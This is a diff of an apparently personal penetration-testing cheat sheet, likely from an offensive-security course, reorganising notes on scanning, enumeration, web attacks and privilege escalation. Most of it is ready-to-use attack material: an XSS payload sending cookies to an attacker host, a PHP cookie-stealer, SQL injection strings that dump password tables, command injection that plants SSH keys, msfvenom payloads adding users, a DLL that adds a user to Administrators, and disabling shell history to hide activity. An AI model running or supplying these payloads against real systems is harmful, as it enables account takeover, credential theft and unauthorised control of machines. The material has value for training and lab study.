@@ -1,7 +1,4 @@
-/////////////// Scans \\\\\\\\\\\\\\\\\
-
-ipcalc <IP w/cider>				#subnet calc
-
+/////////////// SCANS \\\\\\\\\\\\\\\\\ 
 nmap -Pn -sT <IP> -T4 -v
   --script discovery 				#all enumeration options, or use scripts below
     --script smb-os-discovery			#enumerate smb (can also append -p 445)
@@ -9,28 +6,51 @@ nmap -Pn -sT <IP> -T4 -v
     --script http-grep
     --script http-enum				#enumerate website (append -p 80)
     --script banner -p <port>
-proxychains nmap -Pn -sT <IP> -p 80 --script=http-enum		#w/ proxychains, specify port
+NOTE: w/ proxychains, specify port
 
-proxychains nikto -host <IP>			#same as http-enum
--or-
-nikto --host=http://10.50.20.170
+proxychains nikto -host <IP> -or- nikto --host=http:/10.50.20.170	#same as http-enum 
 
 getend services <port>				#resolve a ports service through nsswitch.conf
 
-ssh user@ip -t /bin/bash < all24.sh 		#runs the non-interactive script remotely from target box (-t /bin/bash will try to force bash shell)
+ssh user@ip -t /bin/bash < all24.sh 		#runs the NON-INTERACTIVE script remotely from target box (-t /bin/bash will try to force bash shell)
 
 ssh user@<ip> cat /etc/passwd			#run a single command remotely (can | to filter output)
 
 //Scan script for IPs
 for i in {1..254}; do nc -nzvw1 192.168.1.$i 20-23 80 2>&1 & done | grep -E 'succ|open$|OK$'
 
-//Scan script for ports
+//Scan script for Ports
 for i in {20..22000} ; do nc -nvzw1 <IP> $i 2>&1 & done | grep -E 'OK$|succ|open$'
 
 //Scan with /dev/tcp
 for i in {20.22000} ; do if >/dev/tcp/<IP>/$i ; then echo Port $i & fi done
 
-/////////////////// Linux Enumeration \\\\\\\\\\\\\\\\
+shift ~ c					#ssh escape sequence 
+
+//Web Site Scraping
+(in the url) /robots.txt			#tells you what my be there
+
+wget -r <IP of website>				#creates dir with IP scraped as name
+
+/**********************************************************************************************/
+/////////////////// LINUX \\\\\\\\\\\\\\\\\\\\\\\
+
+//Xfreerdp
+xfreerdp /v:<IP> /u:<USER> /size:1920x1000 /clipboard +home-drive
+
+ipcalc <IP w/cider>				#subnet calc
+ss -or- netstat (-tulpn)			#view listen connections
+ps aux | grep ssh				#view my backgrounded tunnels
+watch -n0 "ss -nutlp"				#watch output in real-time
+
+//Post Exploitation(Actions on box)
+cat /etc/hosts					#looking for next box to scan
+cat /etc/passwd					#look for other users to su to
+cat /etc/group | grep wheel 			#can sudo or switch users
+sudo -l						#see what commands you can sudo
+crontab -l					#see jobs running under your user
+/var/spool/cron 				#scheduled user jobs
+objdump -s -j .rodata /bin/netstat_natpu  	#check out suspicious binary
 
 find / -type f -perm /4000 2>/dev/null		#find files w/ suid / guid set
 find /dev -type f				#find writeable files in /dev
@@ -38,80 +58,61 @@ find / -type d -writable			#find writeable dirs
 find /etc/cron* -writable			#look for something weird (also try without -writeable)
 find / -type f -exec file {} \; | grep PE	#looking for windows exe on linux
 
-echo “a bunch of text” | tr ‘ ‘ ‘\n’		#translate spaces to endlines for /etc/passwd
-
----------------------------
-#check encoding on creds
-	rot13
-	base64
-
-#Check CRONTAB
---------------------------
-cat /etc/crontab				#look for something weird
-cd /etc/cron.d					#look for something weird
-
+file *						#See if files are 'elf' or 'exe'
 uname -a 
 cat /etc/os-release
 cd /etc/rsyslog.d				#cat .conf to see where/what is being logged
-whoami -or- groups -or- id -or who -or- w
-ip neighbor -or- ip a -or- route -or- ip route -or- ip addr
+whoami || groups || id || who || w
+ip neighbor || ip a || route || ip route || ip addr
 unset HISTFILE					#turn off bash command input logging
 set | grep HIST
-file *						#command to see what file is the windows exe
 
-ss -or- netstat (-tulpn)			#view listen connections
-ps aux | grep ssh				#view my backgrounded tunnels
+echo “a bunch of text” | tr ‘ ‘ ‘\n’		#translate spaces to endlines for /etc/passwd
 
-shift ~ c					#ssh escape sequence 
+//Check CRONTAB
+cat /etc/crontab				#look for something weird
+cd /etc/cron.d					#look for something weird
 
-/////////Decode Base65 in CLI/////////
-echo asdfDEF== | base64 -d
+//Check encoding on creds && decode
+echo <passwd> | base64 -d
+echo <passwd> | rot13
 
-///////////////////// Web Site Scraping \\\\\\\\\\\\\\\\\
+//Linux Exploitation
+https://gtfobins.github.io/
 
-(in the url) /robots.txt						#tells you what my be there
-
-wget -r <IP of website>							#creates dir with IP scraped as name
-
-grep -Er '[0-9a-zA-Z]{20}' | grep -vE 'fonts|{*}|js|Binary|css'		#for CTFD only
-
-///////////////////// XSS \\\\\\\\\\\\\\\\\\\\\\\\
-
-1. post to the blog && check from another browser that the post saved on the server
-2. test for XSS ( all text blocks )
-	<script> alert('hell0') </script>
-	<script> alert(/hell0/) </script>
+/**********************************************************************************************/
+///////////////////// XSS \\\\\\\\\\\\\\\\\\\\\\\\ 
+1. Post to the blog && check from another browser that the post saved on the server
+2. Test for XSS ( all text blocks )
+    <script> alert('hell0') </script>
+    <script> alert(/hell0/) </script>
 		 
-3. print out your own cookie
-	<script> alert(document.cookie) </script>
-PHPSESSID=......
+//Print out your own cookie
+    <script> alert(document.cookie) </script>		#PHPSESSID=......(is the cookie)
 
-4. upload this to the blog
-	<script> document.location="http://<IP>/cookie_stealer1.php?username="+document.cookie; </script>
-5. create a cookiefile.txt on the victim or on your own webserver
-6. upload the cookie_stealer.php file to a file upload function or host the file on your own web server
-<?php
-$cookie = $_GET["username"];
-$steal = fopen("/var/www/html/cookiefile.txt", "a+");
-fwrite($steal, $cookie . "\n");
-fclose($steal);
-?>
+3. Upload this to the blog
+    <script> document.location="http://<IP>/cookie_stealer1.php?username="+document.cookie; </script>
+4. Create a cookiefile.txt on the victim or on your own webserver
+5. Upload the cookie_stealer.php file to a file upload function or host the file on your own web server
+    <?php
+    $cookie = $_GET["username"];
+    $steal = fopen("/var/www/html/cookiefile.txt", "a+");
+    fwrite($steal, $cookie . "\n");
+    fclose($steal);
+    ?>
 
-7. or use a nc listener to catch the cookie ( any computer can see our ops station floating ip address ) 
-<script> document.location="http://10.50.24.132:8001? username="+document.cookie;</script>
+//Or use a nc listener to catch the cookie (any computer can see our ops station floating ip address) 
+    <script> document.location="http://10.50.24.132:8001? username="+document.cookie;</script>
 
-////////////////// SQL Injection \\\\\\\\\\\\\\\\\\\\
-
-#Log into SQL DB
-----------------
+/**********************************************************************************************/
+////////////////// SQL Injection \\\\\\\\\\\\\\\\\\\\ 
+//Log into SQL DB
 shell> mysql --user=webuser --password=sqlpass
+grep -r localhost OR grep -i pass *		#CREDS IN DATABASE
+#Once on box look for a .php file with “//Set up DB connection”
+    →mysqli_connect(‘localhost:3306’,’username’,’password’,’database’)
 
-CREDS IN DATABASE --> grep -r localhost OR grep -i pass *
-
-Once on box → look for a .php file with “//Set up DB connection”
-	→mysqli_connect(‘localhost:3306’,’username’,’password’,’database’)
-
-#sql db commands
+//SQL Commands
 ----------------
 show databases;
 show tables;
@@ -119,46 +120,37 @@ use <database>;
 @@version
 ---------------
 
-#Test SQL Susceptibility
+//Test SQL Susceptibility
 ---------------
-url/pick.php?product=7 or 1=1 --> injectable
+url/pick.php?product=7 or 1=1			#Is it injectable? Blank screen means NO
 url/pick.php? union select 1,2,3
 url/pick.php?product=7 union select table_schema, table_name, column_name from information_schema.columns	
 url/select username,user_id,name from siteusers.users
 ---------------
-
 1. test for vulnerability / injection
-Ford' OR 1='1;#
+    Ford' OR 1='1;#
 
 2. use a union statement, see how many columns you need
-Ford' UNION SELECT 1,2;#		#or 1,2,3 -or- 1,2,3,4
+    Ford' UNION SELECT 1,2;#		#or 1,2,3 -or- 1,2,3,4
 
 3. enumerate database information schema		#table_schema is database name
-Ford' UNION SELECT null,table_schema,table_name, column_name FROM information_schema.columns;# 
+    Ford' UNION SELECT null,table_schema,table_name, column_name FROM information_schema.columns;# 
 
 4. get information from database linked to webserver specifically
-	^^ WHERE table_schema=database();#          <--------------
+    ^^ WHERE table_schema=database();#
 
 5. enumerate specific information 
-Ford' UNION SELECT 1,2,name,password from database.users;#
+    Ford' UNION SELECT 1,2,name,password from database.users;#
+NOTE: make sure to check for 0 indexed user ids
 
-//Note: 
-make sure to check for 0 indexed user ids
-
-----------------------------------
 //URL/GET request injection
-
-url/login.php?username=bob’ OR 1=’1 & password =bob’ OR 1=’1
-
-1. if blank page --> not injectable OR if dumps table --> injection point
-?selection=1 OR 1=1 
-
-2. do the rest of the above steps
-
 ----------------------------------
-#LOGIN PAGE
-////ALWAYS try to dump username/password database like this//////
-login.php?username=bob' or 1='1 & passwd=bob'or 1='1 !!!!!!
+url/login.php?username=bob’ OR 1=’1 & password=bob’ OR 1=’1
+----------------------------------
+
+//LOGIN PAGE
+#ALWAYS try to dump username/password database like this	**************************************
+    login.php?username=bob' or 1='1 & passwd=bob'or 1='1
 
 //try injecting into the user input boxes && into the url 
 	login.php?username=tom' or 1='1 and passwd=tom' or 1='1
@@ -166,80 +158,73 @@ login.php?username=bob' or 1='1 & passwd=bob'or 1='1 !!!!!!
 
 #view page source to see what the names of the variables are (password or passwd)
 
-///////////// Command Injection \\\\\\\\\\\\\\\\
-
+//Command Injection
 system("ping -c 1 ".$_GET["ip"]);
 ; cat /etc/passwd
-; && || --> separate commands 
+hey ; whoami
+; && ||			#separate commands 
 
-////////// Malicious File Upload \\\\\\\\\\\\\\
-
-1. upload pony.php to site
-2. nav via url to where the file is saved on the site (i.e /uploads/)
-
-///////////////////// Plant SSH Keys \\\\\\\\\\\\\\\\\\\\
-
+//Plant SSH Keys (via command injection)
 1. ssh-keygen					#make id_rsa.pub on OPs box
 2. <a true statment> ; mkdir /var/www/.ssh	#make .ssh director and authorized keys file (on target box)
 3. <a true statment> ; echo '<id_rsa.pub key>' > ~/.ssh/id_rsa.pub 
 4. ssh to that box
 
-////////////////////// Directory Traversal \\\\\\\\\\\\\\\
+// Malicious File Upload
+1. upload pony.php to site
+2. nav via url to where the file is saved on the site (i.e /uploads/)
 
+// Directory Traversal
 url/image.php?file=../../etc/passwd
-
 ../../../../../../../../../../../../../../../../../etc/passwd
-
 	/etc/group
 	/etc/hosts
 	/etc/resolv.conf
 	/etc/nsswitch.conf
 
-hey ; whoami
-try || -or- &&
-
-/////////////Buffer Overflow (Custom Payloads)\\\\\\\\\\\\\
-
-#show payloads
+/**********************************************************************************************/
+/////////////Buffer Overflow (Custom Payloads)\\\\\\\\\\\\\ 
+//Show payloads
 msfvenom -l payloads | grep x86 | grep linux
 
-#show options of exploit
+//Show options of exploit
 msfvenom -p  linux/x86/adduser --list-options
 
-----------------------------------------------
-#create the custom payload creating a new user
+//Create the custom payload creating a new user
 msfvenom -p  linux/x86/adduser SHELL=/bin/bash -f bash
 -or-
 msfvenom -p  linux/x86/adduser SHELL=/bin/bash -f bash -b'\x00\x0a\x0d\x20'	#take out bad chars
 
 copy and paste output into build-exploit-linux-traditional.sh
 
------------------------------------------------
-#create custom payload using the exec payload
+//Create custom payload using the exec payload
 msfvenom -p linux/x86/exec CMD='usermod -aG sudo user3' -f bash -b '\x00\x0a\x0d\x20'
 
-
+/**********************************************************************************************/
 ////////////////////////// Windows Escalation \\\\\\\\\\\\\\\\\\\\\\\   
-
 check for vulnserver (port 9999)
 
-#find the tasks / services being run 
-schtasks /query /fo LIST /v | select-string -pattern "Task to Run" -Context 0,6 |  more
--or- 
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
+//REGISTRY KEY for usernames/passwords
+hklm/software/microsoft/windows nt/currentversion/winlogon
 
-#enumerate permissions on directories / executables
-icacls <filename or directory>
+//Find the tasks / services being run 
+    schtasks /query /fo LIST /v | select-string -pattern "Task to Run" -Context 0,6 |  more
+      -or- 
+    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
 
-#search for dlls in the source code 
-findstr dll <source code>
+//Enumerate permissions on directories / executables
+    icacls <filename or directory>
 
-#create dll
+//Search for dlls in the source code 
+    findstr dll <source code>
 
+//Create dll
+-------------------------
 #include <windows.h>
 int execCommand()
 {
  WinExec("net localgroup Administrators <user> /add", 1);
+ //WinExec("net localgroup Administrators "Remote Desktop Users" /add", 1);	#optional
  return 0;
 }
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
@@ -247,37 +232,17 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
  execCommand();
  return 0;
 }
+------------------------
+//Compile dll (change example && source to dll name)
+    i686-w64-mingw32-g++ -c -D example.dll source.c && i686-w64-mingw32-g++ -shared -o example.dll source.o -Wl,--out-implib,example.a
 
-#compile dll (change example && source to dll name)
-
-i686-w64-mingw32-g++ -c -D example.dll source.c && i686-w64-mingw32-g++ -shared -o example.dll source.o -Wl,--out-implib,example.a
-
-#download on target
+//Download on target
 use simple http server 
 -or-
 base64 file | xclip -selection clipboard
 
+//Decode file
 certutil -decode file.txt file.exe
 
-#reboot machine
+//Reboot machine
 shutdown -r
-
-REGISTRY KEY for usernames/passwords
-hklm/software/microsoft/windows nt/currentversion/winlogon
-
-////////// Linux Exploitation \\\\\\\\
-
-https://gtfobins.github.io/
-
-watch -n0 "ss -nutlp"
-
-////// Post Exploitation (Actions on box)\\\\\\\\
-
-cat /etc/hosts					#looking for next box to scan
-cat /etc/passwd					#look for other users to su
-cat /etc/group | grep wheel 			#can sudo or switch users
-sudo -l						#see what commands you can sudo
-crontab -l					#see jobs running under your user
-cat /etc/cron 					#scheduled system jobs
-/var/spool/cron 				#scheduled user jobs
-objdump -s -j .rodata /bin/netstat_natpu  	#check out suspicious binary
